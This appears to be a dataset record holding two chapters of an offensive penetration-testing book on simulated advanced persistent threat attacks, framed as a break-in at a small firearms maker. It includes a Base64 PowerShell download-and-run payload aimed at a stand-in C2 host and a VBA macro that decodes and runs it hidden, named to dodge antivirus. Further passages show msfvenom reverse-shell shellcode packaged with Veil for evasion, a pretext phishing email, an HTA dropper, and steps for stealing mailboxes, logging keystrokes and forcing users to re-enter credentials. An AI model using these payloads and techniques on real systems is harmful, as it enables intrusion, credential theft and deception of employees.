[System.Convert]::ToBase64String($b)\nUG93ZXJTaGVsbCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCd\nodHRwOi8vb3VyYzJzZXJ2ZXIuY29tL2Rvd25sb2FkL2MyYWdlbnQuZXhlJywnYWdlbnQuZXhlJyk7U3\nRhcnQtUHJvY2VzcyAnYWdlbnQuZXhlJw==\nThe first command assigns the payload to a string of bytes called $b and the\nsecond command converts it to Base64.\nThe next step is to create a VBA macro capable of decoding this string and\nexecuting it:\nOption Explicit\nPrivate Const clOneMask = 16515072\nPrivate Const clTwoMask = 258048\nPrivate Const clThreeMask = 4032\nPrivate Const clFourMask = 63\nPrivate Const clHighMask = 16711680\nPrivate Const clMidMask = 65280\nPrivate Const clLowMask = 255\nPrivate Const cl2Exp18 = 262144\nPrivate Const cl2Exp12 = 4096\nPrivate Const cl2Exp6 = 64\nPrivate Const cl2Exp8 = 256\nPrivate Const cl2Exp16 = 65536\nPublic Function monkey(sString As String) As String\nDim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte,\nlPowers6(63) As Long, lPowers12(63) As Long\nDim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar\nAs Long, lPos As Long, sOut As String\nDim lTemp As Long\nsString = Replace(sString, vbCr, vbNullString)\nsString = Replace(sString, vbLf, vbNullString)\nlTemp = Len(sString) Mod 4\nIf InStrRev(sString, \"==\") Then\niPad = 2\nElseIf InStrRev(sString, \"=\") Then\niPad = 1\nEnd If\nFor lTemp = 0 To 255\nSelect Case lTemp\nCase 65 To 90\nbTrans(lTemp) = lTemp - 65\nCase 97 To 122\nbTrans(lTemp) = lTemp - 71\nCase 48 To 57\nbTrans(lTemp) = lTemp + 4\nCase 43\nbTrans(lTemp) = 62\nCase 47\nbTrans(lTemp) = 63\nEnd Select\nNext lTemp\nFor lTemp = 0 To 63\nlPowers6(lTemp) = lTemp * cl2Exp6\nlPowers12(lTemp) = lTemp * cl2Exp12\nlPowers18(lTemp) = lTemp * cl2Exp18\nNext lTemp\nbIn = StrConv(sString, vbFromUnicode)\nReDim bOut((((UBound(bIn) + 1) \\ 4) * 3) - 1)\nFor lChar = 0 To UBound(bIn) Step 4\nlQuad = lPowers18(bTrans(bIn(lChar))) +\nlPowers12(bTrans(bIn(lChar + 1))) + _\nlPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar +\n3))\nlTemp = lQuad And clHighMask\nbOut(lPos) = lTemp \\ cl2Exp16\nlTemp = lQuad And clMidMask\nbOut(lPos + 1) = lTemp \\ cl2Exp8\nbOut(lPos + 2) = lQuad And clLowMask\nlPos = lPos + 3\nNext lChar\nsOut = StrConv(bOut, vbUnicode)\nIf iPad Then sOut = Left$(sOut, Len(sOut) - iPad)\nmonkey = sOut\nEnd Function\nSub testb64()\n'\n' testb64 Macro\n'\n'\nDim PSResp As String\nPSResp =\nShell(monkey(\"UG93ZXJTaGVsbCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCd\nodHRwOi8vb3VyYzJzZXJ2ZXIuY29tL2Rvd25sb2FkL2MyYWdlbnQuZXhlJywnYWdlbnQuZXhlJyk7U3\nRhcnQtUHJvY2VzcyAnYWdlbnQuZXhlJw==\"), vbHide)\nEnd Sub\nNote that the Shell command is now calling the monkey function, which takes\nthe Base64 string as input. Why monkey? Because it's not obviously a decoding\nfunction. If it was called Base64Decode (for example), the AV might be\ntempted to take a closer look.\nAlternative Strategies in Antivirus Evasion\nYou are probably getting the impression by now that I am determined to\nreally hammer home the importance of getting around AV. It's important to\nunderstand that the only things AV is good for is stopping known vanilla\nattacks and annoying penetration testers. In any APT attack, all tools should\nbe custom and tested against known defenses before being deployed,\nrendering the issue of AV somewhat moot. However, there are times when\nyou're going to want to use tools written by others for convenience or due to\ntime constraints and it is critical to ensure that they're not going to get\ndetected.\nThe most obvious example is Metasploit agents that you'll want to deploy over\nyour own C2. As Metasploits are very well known and well understood by AV\nvendors, it's necessary to do a little extra work to keep them from being\ndetected. A nice solution to this is the Veil Evasion toolkit written by Harmj0y\nand friends; you can get it here:\nhttps://www.veil-framework.com/framework/veil-evasion/\nI give two examples of how to use Veil Evasion:\nTaking pre-armored shellcode and using it to create a robust executable.\nSecuring non-armored shellcode with AES encryption to create a compiled\nPython executable.\nThe toolkit is capable of a lot more than this. If you're reading this book and\nare not aware of Veil Evasion, you owe it to yourself to check it out.\nIn the first example, a shellcode payload for a Meterpreter callback agent has\nalready been created using msfvenom and the following command line:\n# msfvenom -a x64 --platform Windows -p\nwindows/x64/meterpreter_reverse_http -e x86/fnstenv_mov -i 5 -f raw\nLPORT=1234 LHOST=ourc2server.com EXITFUNC=none -o raw_shellcode\nFound 1 compatible encoders\nAttempting to encode payload with 5 iterations of x86/fnstenv_mov\nx86/fnstenv_mov succeeded with size 1190492 (iteration=0)\nx86/fnstenv_mov succeeded with size 1190516 (iteration=1)\nx86/fnstenv_mov succeeded with size 1190540 (iteration=2)\nx86/fnstenv_mov succeeded with size 1190564 (iteration=3)\nx86/fnstenv_mov succeeded with size 1190588 (iteration=4)\nx86/fnstenv_mov chosen with final size 1190588\nPayload size: 1190588 bytes\nSaved as: raw_shellcode\nThis will create a Windows reverse HTTP connector using a variable-length\nFnstenv/mov Dword XOR encoder.\nThis is now ready to be used in Veil, as shown in Figure 5.6.\nFigure 5.6: Veil-Evasion landing screen.\n# ./Veil-Evasion.py\nUse payload 41 and set the options as shown in Figure 5.7.\nFigure 5.7: Veil with options set.\nType generate and, on the next screen, select Option 3—File with Shellcode\n(Raw). Then enter the filename where the output was saved (in this case,\nraw_shellcode). See Figure 5.8.\nFigure 5.8: Veil can now generate a compiled Python executable from the\nraw shellcode.\nThe code is generated, as shown in Figure 5.9.\nFigure 5.9: The compiled executable is ready for use.\nThe previous example is somewhat contrived, as Veil Evasion is perfectly\ncapable of natively creating obfuscated AV proof Meterpreter callbacks, but I\nwanted to demonstrate creating payloads from flat shellcode, as you may want\nto be using something other than Meterpreter. The options are suggestive—\nyou'll need to experiment with the settings to make your payload truly\nstealthy.\nFor the second example, I create another .exe using more or less the same\nmsfvenom parameters, but this time excluding the encoding:\n# msfvenom -a x64 --platform Windows -p\nwindows/x64/meterpreter_reverse_http -f raw LPORT=1234\nLHOST=ourc2server.com EXITFUNC=none -o raw_shellcode\nNo encoder or badchars specified, outputting raw payload\nPayload size: 1190467 bytes\nSaved as: raw_shellcode\nThis time in Veil Evasion, I select payload 35 -\npython/shellcode_inject/aes_encrypt.\nIf you proceed with the same options as the first example, you'll see\nsomething similar to Figure 5.10.\nFigure 5.10: Once again, it's ready to use.\nLastveil.png\nOne last word on this tooling and I'll leave the notion of antivirus alone for a\nwhile. A very nice feature of Veil Evasion is that whenever it creates a payload,\nit stores a SHA256 hash of the .exe in its own database. This allows you in the\nfuture to tell if anyone else has submitted the payload to Virus Total for\nanalysis, which is of course generally not a good thing for your mission.\nThe Attack\nAs stated earlier in the chapter, it is preferable to know in as much detail and\nwith as much forethought as possible exactly what you're interested in taking\nfrom the target network prior to commencing an engagement. It sounds\nobvious—firearms schematics—but all that is currently known about the\ntarget is that they manufacturer firearms and are heavily invested in CNC\ntechnology. There are a finite number of CAD technologies that are suitable\nfor such work and that can export designs compatible with these machines.\nKnowing what tech (and therefore file extensions and so forth) is in use\nbeforehand will save you time when scouring the infrastructure for data.\nThis is not as difficult as it sounds. A quick Google search elicits a web page\nand, buried within a Q&A session about their hand guns designs, there is\nexactly what you need.\nGun Design Engineer Answers Your Questions\nWhat CAD software do you use to design your firearms?\nWe use Solid Edge ST8 currently, but started at ST 3 versions 14, I\nbelieve.\nThat's enough to get started. Solid Edge is a 3D CAD, parametric feature\n(history based) and synchronous technology solid modeling software. It runs\non Microsoft Windows and provides solid modeling, assembly modeling, and\n2D orthographic view functionality for mechanical designers. It's currently\nowned and developed by Siemens AG. A free trial is available so there's no\nexcuse not to download it, take it around the block, and make a note of its\ncore filenames and data file extensions so that engineering workstations can\nbe quickly identified once the target network has been penetrated. Figure 5.11\nshows the file types.\nFigure 5.11: A Save As dialog box shows the file types Solid Edge works with.\nSimilarly, the Solid Edge program directory shown in Figure 5.12 lists which\napplications to hunt for.\nFigure 5.12: Solid Edge application directory.\nIdentifying the Players\nBefore going after individual targets, it's a good idea to get an overview of the\ncompany itself. This doesn't have to be particularly detailed but as with every\nother aspect of APT modeling, time and effort is proportionally rewarded. At a\nminimum, I want:\nThe rough number of employees\nEmployee names and positions\nEmail address format\nBusiness locations\nThis is what OSINT is all about. I mentioned LinkedIn and other business\nnetworking sites in the past and it remains the best single source of target\ninformation. The only issue with LinkedIn is that it tends to over represent\nprofessional level positions and IT personnel. This is a very broad statement\nbut worth considering given that I want to target the gunsmiths and the CNC\ntechnicians. It's a general rule of thumb that you want to avoid more IT savvy\npeople when trying to crack the outer shell of a network, so it's good to have\nmultiple sources of intelligence. Different professions have their own staff\ndirectories where you can find resumes and contact information; the gun\nmanufacturing industry is no different.\nCompany location information is easily obtainable from public websites, as is\nthe employee count. Why care about how many people work there? The\nnumber of employees tends to determine how technical problems are solved.\nLarger companies likely have all of their infrastructure in-house and\nmaintained by their own employees, whereas small companies outsource\neven basic infrastructure. This is not a hard and fast rule, but a again, it's a\ngood rule of thumb. A quick search reveals that Gotham Small Arms has\nfewer than 50 employees and is using Google Gmail to provide email services:\n# dig gothamsmallarms.com MX\n; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> gothamsmallarms.com MX\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47163\n;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 2, ADDITIONAL: 0\n;; QUESTION SECTION:\n;gothamsmallarms.com. IN MX\n;; ANSWER SECTION:\ngothamsmallarms.com. 3600 IN MX 5\nALT1.ASPMX.L.GOOGLE.com.\ngothamsmallarms.com. 3600 IN MX 5\nALT2.ASPMX.L.GOOGLE.com.\ngothamsmallarms.com. 3600 IN MX 1\nASPMX.L.GOOGLE.com.\ngothamsmallarms.com. 3600 IN MX 10\nASPMX2.GOOGLEMAIL.com.\ngothamsmallarms.com. 3600 IN MX 10\nASPMX3.GOOGLEMAIL.com.\n;; AUTHORITY SECTION:\ngothamsmallarms.com. 3595 IN NS\nns78.domaincontrol.com.\ngothamsmallarms.com. 3595 IN NS\nns77.domaincontrol.com.\n;; Query time: 154 msec\n;; SERVER: 80.69.67.66#53(80.69.67.66)\n;; WHEN: Tue May 17 12:47:30 2016\n;; MSG SIZE rcvd: 217\nThis is interesting. If they're using Google's professional cloud services for\nemail, they may also be using them for document sharing, which can make\nthings easier for stealing documents. But they probably have a policy that it\nnot be used for sensitive intellectual property (or they should—I worked for a\nsecurity company that stored pen test reports on Google Docs).\nSmart(er) VBA Document Deployment\nWith a list of targets, it's time to build the payload.\nEarlier in this chapter, I revisited a highly effective deployment mechanism:\nthe VBA macro. In the original discussion of this method, email was used as\nthe delivery vector; however, this is not optimal. Email is generally heavily\nscrutinized as it is the easiest way for malware to enter the network and it's\nlikely that certain attachments are going to be blocked at the border\n(potentially macros carrying MS Office documents as well). Also, delivering\nattachments that way means that evidence will linger in a way it won't if we\njust send a link to a file, for example. However, even if you send the user a\nlink to a Word document on a web server, it doesn't alter the fact that the\nsecurity software running on the workstation may detect and block it due to\nthe .docm extension. How do you get around that? There is a solution but it is\nhighly secret and known only to the world's most elite hackers. You rename\nthe file from .docm to .doc.\nDon't tell anyone.\nInstead of sending the document directly to the targets, I'll host it on an\nexternal web server as a .doc file and send only the link via email. That way,\noverly aggressive mail filters will not be a problem. There's still a danger that\nfiles could be searched for macros at the border of the network, but it's a lot\nless risky than email, as that is where most malware is expected to enter the\nnetwork. Social engineering when delivering Office documents is a matter of\ncircumstance and personal taste, but variations of the following are often\nsuccessful. Not to stress the point but there are two things that you have to\nget right:\nGive the end user a compelling reason to enable macros. The document\nshould not give any real information to the target and should strongly\nsuggest that macro interaction is required in order to render the document\nuseful or readable. It should also be something that catches the eye and is\nattractive. Early in the book, I wrote about using a message that discussed\nredundancies and appeared to be improperly addressed. There are many\nvariations of this powerful attack but it should be something that implies a\nchange of circumstances for the receiver—usually negative circumstances\n(panic rides roughshod over common sense).\nTailor the attack to the client. It shouldn't look like just another massive\nfishing exercise insisting that their PayPal accounts have been\ncompromised. Spend some time researching how their documents look,\nwhere the logo is positioned and how it is formatted, what typeface is\nused, and so forth. Google is your friend but also scan the target's public\nfacing websites. You can generally find PDFs at the very least that will give\nyou something to work with. Most companies have an info@ email address\nthat will usually send an automated response, which is useful for forging\nemail footers. You can also send a mass BCC email to the addresses you've\nharvested on whatever pretext you want and see who bites. It's also likely\nthat at least one inbox will respond with an “Out of Office” message, which\nare handy for many reasons, the formatting being the least. Now you know\nwho's unavailable (particularly in a large organization), which gives you\nsome flexibility if you need to impersonate employees without them being\nimmediately alerted to that fact (see Figure 5.13).\nFigure 5.13: The victim will still have to Enable Content but that's a social\nengineering issue.\nThe question now is what social engineering approach should you use to\npique the target's interest? A variation on the old improperly addressed\nredundancy notice should serve well enough.\nTo: target@gothamsmallarms.com\nFrom: carmine.falcone@gotham-audit.com\nSubject: [CONFIDENTIAL] Gothams Small Arms merger update\nHi Oswald,\nI hope this finds you well.\nI've attached a link the numbers we discussed last week so hopefully\nthis won't come as too much of a shock. That said, this is still pre-\nembargo confidential as per FTC rules, so please don't distribute.\nGiven the large number of employees who are going to be shed as a\nresult of the merger, I'm going to recommend a professional skills\ntransition counselor to your department when I see you guys next\nweek.\nhttp://1.2.3.4/intranet/downloads/gothammerger_v1.4_CF_21032016.doc\nRegards,\nCarmine\np.s. Give my love to Gertrud!\n***** Email confidentiality notice *****\nThis message is private and confidential. If you have received this\nmessage in error, please notify us and remove it from your system.\nEmail and Saved Passwords\nA quick and easy way to gain situational awareness having compromised a\nuser's workstation is to grab their email in a format you can import into an\nemail client on your own machine. This can be a goldmine of information,\nsuch as names, email addresses, documents, and other organizational\ninformation—even passwords if you're very lucky. You'd be amazed how many\npeople keep a backup of their corporate passwords in an Excel spreadsheet\nand email it to themselves as a backup—security policy be damned.\nIn a typical corporate environment, users will have Microsoft Outlook as an\nemail client and calendar tied into Microsoft Exchange. Generally, users will\nonly have a finite Exchange mailbox size and will be required to periodically\ntransfer mails to a local store if they want to keep them. These resulting\nPersonal Storage Table (.pst) files can be imported easily and without any\nconversion, whether in the Inbox, Sent Items, or any other folder. Otherwise,\nExchange stores email data in its own Offline Stored Table (.ost) format,\nwhich (as the name implies) are locally stored on the client's workstation,\nallowing them to access their emails even when they're not connected to the\nExchange server.\nMicrosoft claims that it is not possible to directly import .ost files into\nanother Outlook client or convert them into .pst files for the same purposes\nwhich, if true, would complicate things. However, there are a number of tools\navailable online for a small fee that make such a conversion a one-click\nprocess without the need for any other data such as MAPI profiles. There is\nvery little difference among such utilities so I'll refrain from making\nrecommendations here.\nSimilar techniques can be used to steal email from other email clients, and\nthis is something I want to explore in the exercises that follow.\nA compromised workstation can be a cornucopia of stored credentials. Many\napplications allow users to store their usernames and passwords for their\nconvenience (i.e., an SFTP client). Most programs, though, will store these\npasswords encrypted, usually in a local config file or in the Registry. In these\ncircumstances, there are two possible attacks:\nDecrypting the credential store. Some software is more susceptible to this\nattack than others, but any cryptographic technology that stores small\namounts of data such as passwords is inherently vulnerable to crypto-\nanalytic attack (assuming the passwords are not excessively long). A\nsimple Google search will usually suffice to discover how a password is\nbeing encoded and what tools can be used to recover it.\nIt's not always possible to recover encrypted passwords in this manner if\nthe crypto system cannot be determined or if the passwords are too long to\npermit a successful crypt-and-compare attack. In these instances, it is\nusually sufficient to copy the encrypted hashes, install the client\napplication, and re-create the login file or Registry entries locally. This\nwon't give you access to the unencrypted passwords but will let you access\nthe applications they are intended to secure. Alternatively, if the\nconnection protocol the client uses is not encrypted (i.e., Telnet and FTP—\npeople do still use these on local networks and elsewhere), you can use a\nnetwork sniffer (such as Wireshark) on your own machine to see the\npassword transmitted in the clear.\nIn this scenario, the target is outsourcing their email needs to Google, which\npermits users access to their inboxes using the familiar Gmail interface.\nHowever, it is perfectly common to see businesses that do so continue to use\nMS Outlook on the desktop and integrate into the Google mail backend. This\nusually has to do with legacy, familiarity, and compatibility.\nKeyloggers and Cookies\nKeyloggers are used to steal keystrokes from the victims as they type and are\nmostly useful for stealing passwords. Keystrokes are logged to a file for later\nretrieval or transmitted back to C2 in real time or at regular intervals. There's\nnothing new or innovative about the use of a keylogger, but it's a core tool and\ndeserves one or two words on how it should be used properly.\nHelpfully, the Metasploit Framework includes a keylogger that's adequate and\nillustrative enough for our needs. As part of the Meterpreter agent, it's also\nresilient to antivirus with adequate preparation. As with any attack that uses\nMeterpreter, the agent should first be migrated to another stable process prior\nto use to ensure that it will remain in memory even if the process that\nspawned it is killed. For general use, the explorer.exe process is perfectly\nacceptable; however, if your goal is to capture Windows logon credentials, you\nmust first inject into the winlogon.exe process.\nAs stated, keyloggers are most useful for capturing usernames and passwords,\nbut obviously are going to work only if the user types these credentials, which\nis not going to happen in certain circumstances. For example, in the previous\nexample I discussed stored passwords. However, it's more likely you will\nencounter web applications that won't prompt the users for passwords\nbecause session state is maintained through the use of persistent cookies.\nYou can of course steal the cookies from the browser directory in order to\nhijack the user's session, but there are plenty of ways to defeat such attacks\n(for example, the server tracks IP addresses in the session or doesn't permit\nconcurrent logins) and there are plenty of situations when you will want the\ncredentials themselves. Users frequently reuse passwords across applications\nand environments after all. In such circumstances, the solution is simply to\ndelete the cookies and force the users to log in the next time they visit the\nweb page.\nIn IE, this is simply achieved from the command line:\nc:> RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2\nChrome stores history, cookies, cache, and bookmarks in various databases\nand directories in the per-user application data directory at\nC:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\nThe easiest way to get rid of all this data is just to erase the appropriate files\nfrom there. Chrome creates this directory automatically if it finds that it's\nmissing.\nA similar approach can be used for Firefox, Opera, and Safari.\nGiven that the target is using Google for email, it is highly likely that some or\nall of the users will be using a web-based interface to access their inboxes. The\nimportance of expiring any current persistent sessions, forcing them to enter\ncredentials in the browser, is clear.\nBringing It All Together\nTo recap:\nIn this attack, a variant of the VBA macro was used as a means of attacking\nthe end user, gaining access to the client workstation, and deploying a C2\nagent. The code was considerably simplified compared to what was\ndescribed in Chapter 2. There's no need to deploy a VBS payload to\ndownload and execute a payload; just use what Windows gives you on the\ncommand line.\nInboxes were stolen from the target workstations in the form of .pst files\nthat can be easily imported into your own instance of Microsoft Outlook.\nThis permits the attacker to browse emails as easily as if they were his\nown. Think about the things you share with your colleagues every day\nwithout using encryption. Even with encryption, private keys can be stolen\nfrom the workstation and passphrases can be stolen with keyloggers.\nGoogle mail passwords were stolen using keyloggers, permitting access\nnot only to the web-based email interface, but also to document stores that\naccount is linked to. Any clients using persistent cookies had their cookie\nstores deleted, this forcing the client to re-authenticate and to allow the\nattacker to capture the credentials.\nAt this point, even assuming control only over a few workstations, access can\nbe considerable. An attacker could go dark for extended periods of time while\nmaintaining a C2 foothold over the target and slowly expand influence over\nthe network. At this point, the only thing to do is to search for and exfiltrate\nthe target files based on the criteria already established.\nAnd so it proves (see Figure 5.14).\nFigure 5.14: Lower receiver schematic in Solid Edge 3D.\nSource: Own work\nSummary\nBy necessity, a lot of new information was crammed into this chapter. We\nlooked at covert command and control, the ever-present danger of\nransomware, and how awareness of this threat should fit into an APT\nmodeling exercise. We covered different ways to use an already familiar\ntechnology to crack border security and alternative ways to bypass antivirus\ntechnology. Finally, the concepts of keyloggers, stealing email, and cached\nencrypted passwords were discussed.\nThe next chapter is no different. Lots of new concepts will be covered. Not the\nleast, we will be covering privilege escalation techniques in depth. This is a\ncore APT modeling skill that we've thus far only touched on.\nExercises\n1. There are several alternative email clients that can serve as a replacement\nto Microsoft Outlook. Some have Exchange integration and some not.\nInvestigate how email boxes could be stolen from workstations with the\nfollowing mail clients installed:\nOpera Mail\nDreammail\ni.Scribe\nPostbox\nEvolution\n2. You have to attack a host only accessible via the Tor network in a\ntraditional network penetration test. You will immediately run into DNS\nissues resolving the .onion addresses. How would you resolve these issues\nso that you could bring your favorite tools to bear against the target?\n3. Imagine you are running a Tor Hidden Service to provision a black market\nonline business. Think about some ways that the anonymity of your web\nserver could be compromised and how you could protect yourself against\nthem. Read about Ross Ulbricht and the Silk Road for context.",
    "question": "What is the main method described for deploying a custom binary to a target domain in the context of an APT modeling exercise?",
    "summary": "The text discusses how to model an advanced persistent threat (APT) attack on a company's network, focusing on gaining access and deploying a ransomware attack. It highlights the use of VBA macros, command and control (C2) via Tor, and the potential for data theft and extortion. The text also emphasizes the importance of securing intellectual property and the risks associated with ransomware, as well as the need for awareness and preparedness. Additionally, it covers techniques for bypassing antivirus software and stealing sensitive information like email credentials and passwords."
  },
  {
    "start": 42,
    "end": 47,
    "text": "Chapter 6\nCriminal Intelligence\nA few years ago I was called upon to perform an internal APT-modeling\nscenario for a police service in the UK. It was an interesting assignment for a\nnumber of reasons, not all of them purely technical. At a police HQ they don't,\ngenerally speaking, want you wandering around by yourself, so every morning\nmy colleague and myself would dutifully arrive at the front desk to meet our\npoint of contact whose job was also to escort us around the building as\nnecessary. On day three we asked for the gentleman again only to be taken\naside by a couple of police officers who wanted to know what our business\nwas with him. I explained we were security consultants, here to fight the good\nfight against the ever-present forces of darkness (we pen testers are a colorful\nbunch) only to be told that our point of contact was actually a fugitive from\njustice and had been arrested the previous evening. I never did find out\nexactly what that was all about, but it takes a certain amount of chutzpah to\napply for a job with the police knowing you're a wanted man.\nI mention this anecdote not only because of its obvious comical nature but\nbecause there is a practical lesson to learn—regardless of a lack of escort, we\nstill had a job to do and given that this was a busy place with uniformed\nofficers and civilians walking in and out of the building all the time without\nany real access control (beyond what was essentially voluntary), we decided to\njust go ahead and complete our work. I guess they thought no one would have\nthe nerve to walk around a police HQ without permission, which given the\nsheer amount of confidential data we were able to obtain during this test with\njust a little bit of nerve was a bad call on their part. The scope was as open as\nit could be (i.e., get what you can in the time available), but when we'd\ncompleted our work we had complete access to:\nEmergency calls databases\nSpecial Branch target packages\nDetailed information on informants\nRead access to the National DNA database\nNames and addresses of firearms owners in the county\nFIREARMS LAW IN THE UK\nThe United States and the UK have massively different philosophies on\nfirearm ownership. Put simply, it is very easy to obtain guns in the United\nStates and extremely hard in the UK (legally at any rate). An American\ncolleague of mine (living at the time in England) casually asked me one\nday if it was necessary to carry handguns openly or if he could do so\nconcealed. Realizing that he was serious, I pointed out that the minimum\npenalty for carrying a handgun in public was five years in prison and\ntherefore “concealed” was probably the wisest course.\nPayload Delivery Part VI: Deploying with HTA\nThis is not a technique that is exactly going to change your life, but one\nparticularly useful way to deploy payloads via VBScript is to use an HTML\napplication. This is essentially just HTML carrying a client-side script\nrenamed to have an .hta extension. Why not just use an HTML file to do the\nsame thing? Two reasons. First of all, VBScript will only execute in Internet\nExplorer, which is currently only the fourth most popular browser and in\nserious decline. Secondly, even if an HTML payload is opened in IE, the user\nwill receive a warning that it contains active content that will likely be blocked\nby administrative policy (see Figure 6.1).\nFigure 6.1: Not the most inviting message.\nThe following code is adequate for gaining basic command execution through\nsimple user interaction:\n<head>\n<title>HTA Test</title>\n<HTA:APPLICATION\nAPPLICATIONNAME=\"HTA Test\"\nSCROLL=\"yes\"\nSINGLEINSTANCE=\"yes\"\nWINDOWSTATE=\"maximize\"\n>\n</head>\n<script language=\"VBScript\">\nSub TestSub\nDim objShell, objCmdExec\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objCmdExec = objshell.exec(\"c2agent\")\ngetCommandOutput = objCmdExec.StdOut.ReadAll\nEnd Sub\n</script>\n<body>\n<input type=\"button\" value=\"Run Script\" name=\"run_button\"\nonClick=\"TestSub\"><p>\n</body>\nThis code renders as shown in Figure 6.2, without warnings or errors when\nsaved as an.hta document and executed.\nFigure 6.2: A basic HTML application.\nIf the user clicks the button we get command execution. Not very appealing, is\nit? Luckily, the basis for an HTML application is LaTex rendering! No, only\njoking, it's actually HTML so it's possible to make the application look, feel,\nand behave exactly as you want it to. Before that, you want to change the\ndefault icon to something more appealing. First, add the following line to the\nHTA:APPLICATION tag:\nicon=\"#\"\nThen with a custom icon, execute the following from the Windows command\nline:\ncopy icon.ico /b /y +test.hta teswithicon.hta\nYou'll get something similar to Figure 6.3.\nFigure 6.3: That's a little bit better, but let's select something that fits the\nattack.\nMalware Detection\nUsing non-compiled scripting languages can be a useful way to avoid more\nadvanced malware detection platforms. For example, FireEye's products and\nPalo Alto's endpoint protection are relatively effective against a range of\nattacks that leave AV in the dust. However, their tendency is toward reaching\na good/bad verdict on compiled executable code and subsequently blocking it\nthrough behavioral analysis as well as real-time “known bad” detection.\nHowever, this can be sidestepped altogether by using “known good” (i.e.,\nPowerShell and the Windows Scripting Host) to execute our payloads. When\nthe script is obfuscated or, in this case, not obfuscated at all, it stands up\nremarkably well against such technology. This is simply because the\nexecutables behind the scripting tools are known not to be malicious and the\nscripts themselves are seen merely as parameters. Conventional antivirus is\nsurprisingly ignorant of these alternative (but trivial) means of getting\ncommand execution, as shown in Figure 6.4.\nFigure 6.4: The inevitable VirusTotal example.\nWe could also build on previous examples and use VBScript merely as a\nmeans to deliver and execute a PowerShell payload.\nThis is a simple but powerful attack. It aims to exploit the user's ignorance of\nfile extensions. It looks like a web page, yet can give you command execution\nwithout displaying warnings to the target and without triggering the antivirus\nsoftware.\nPrivilege Escalation in Microsoft Windows\nWhen command execution has been obtained on a target workstation, the\nfirst goal, generally speaking, is to escalate one's privileges to obtain the\nhighest permissions possible locally. This allows you to obtain password\nhashes, modify the host's configuration, use raw sockets, and generally make\nnetwork colonization smoother. You might get lucky and land on a\nworkstation where the users already have elevated privileges due to their role\nor simply through poor security policies, but I'll assume you're stuck in\nuserland and need administrative permissions. Broadly speaking, privilege\nescalations do one of two things: they exploit vulnerable software or exploit\nvulnerable configurations. This section is by no means complete or intended\nto be. The following can be divided into various loose categories, but here I\nwill divide the attention as follows:\nLocal exploit—Some software needs to be able to run with elevated\nprivileges in order to function correctly and sometimes software is given\nmore privileges than it needs. Either way, if vulnerabilities (usually\nmemory corruption bugs) are present, then the software can be tricked\ninto giving command execution at an equivalent level. Local exploits exist\nin both the core Microsoft technology deployed universally (which is\nobviously ideal) and software from third parties.\nFlawed installation method—When a Windows image is rolled out, a guy\nis not going to traipse from workstation to workstation to install each\nmachine manually; instead, the process will be automated. There are ways\nthis can be achieved but the important thing is that the process can leave\nbehind configuration files that contain useful information, such as\npasswords (which are often in plaintext) or Base64 (which is trivial to\ndecode).\nScheduled tasks—Sometimes these will have modifiable target files that\ncan be replaced by your own code. Incidentally, I'll take the opportunity\nhere to talk about the various ways you can use scheduled tasks to achieve\npersistence.\nVulnerable services—Service tasks can have various levels of security. If a\nuser-level account can modify service parameters, it may be possible to\nuse it to gain command execution at an elevated level.\nDLL hijacking—This involves taking advantage of poor file system security\nto overwrite a Dynamic Link Library (DLL). DLLs are executed in the same\nprocess space (and therefore with the same privileges) as the executable\ncalling them. If an executable runs as SYSTEM, for example, and we replace\nthe DLL with our own, we can achieve code execution with SYSTEM\nprivileges.\nRegistry checks—Useful for finding binaries that are automatically\nexecuted on boot that can also be overwritten. Additionally, the\nAlwaysInstallElevated setting lives in the Registry. If enabled, it allows\nusers to install .msi installation binaries as SYSTEM even when their\naccounts do not have SYSTEM rights. I hope the dangers here are obvious.\nBefore continuing, it's worth pointing out that the more information you can\ngrab the easier your task will be. As with all the topics covered in this book,\nthere is more to privilege escalation than simply following a list. That said,\ngrasping the following techniques is essential to a good understanding of the\nsubject. Another quick point that's worth making is that one variable can't be\npatched or fully secured—people. Low-tech attacks can be effective against\nlow-tech users (and indeed those who should know better). This can be as\nsimple as writing a straightforward app that mimics the Windows UAC\npassword request box and seeing what they type, as shown in Figure 6.5.\nFigure 6.5: User Account Control dialog box. This can look however you\nwant.\nEscalating Privileges with Local Exploits\nThe first thing I generally do when attempting to escalate privileges on a\nWindows system is look at which patches are installed. If a host is poorly\npatched, you can get a win pretty quickly without having to trawl the system\nlooking for poor configurations. The following command line will list all\ninstalled patches:\nC:\\users\\wallsopp> wmic qfe get\nCaption,Description,HotFixID,InstalledOn\nCaption Description HotFixID\nInstalledOn\nhttp://support.microsoft.com/?kbid=3024995 Update\nKB3024995 2/1/2016\nhttp://go.microsoft.com/fwlink/?LinkId=133041 Update\nKB2849697 12/23/2014\nhttp://go.microsoft.com/fwlink/?LinkId=133041 Update\nKB2849696 12/23/2014\nhttp://go.microsoft.com/fwlink/?LinkId=133041 Update\nKB2841134 12/23/2014\nhttp://support.microsoft.com/ Update\nKB2670838 12/23/2014\nhttp://support.microsoft.com/?kbid=2305420 Security Update\nKB2305420 12/24/2014\nhttp://support.microsoft.com/?kbid=2393802 Security Update\nKB2393802 12/24/2014\nhttp://support.microsoft.com/?kbid=2416754 Hotfix\nKB2416754 12/24/2014\nhttp://support.microsoft.com/?kbid=2479943 Security Update\nKB2479943 12/24/2014\nhttp://support.microsoft.com/?kbid=2491683 Security Update\nKB2491683 12/24/2014\nhttp://support.microsoft.com/?kbid=2506014 Update\nKB2506014 12/24/2014\nhttp://support.microsoft.com/?kbid=2506212 Security Update\nKB2506212 12/24/2014\nhttp://support.microsoft.com/?kbid=2509553 Security Update\nKB2509553 12/24/2014\nhttp://support.microsoft.com/?kbid=2511455 Security Update\nKB2511455 12/24/2014\nhttp://support.microsoft.com/?kbid=2532531 Security Update\nKB2532531 12/24/2014\nhttp://support.microsoft.com/?kbid=2534111 Hotfix\nKB2534111 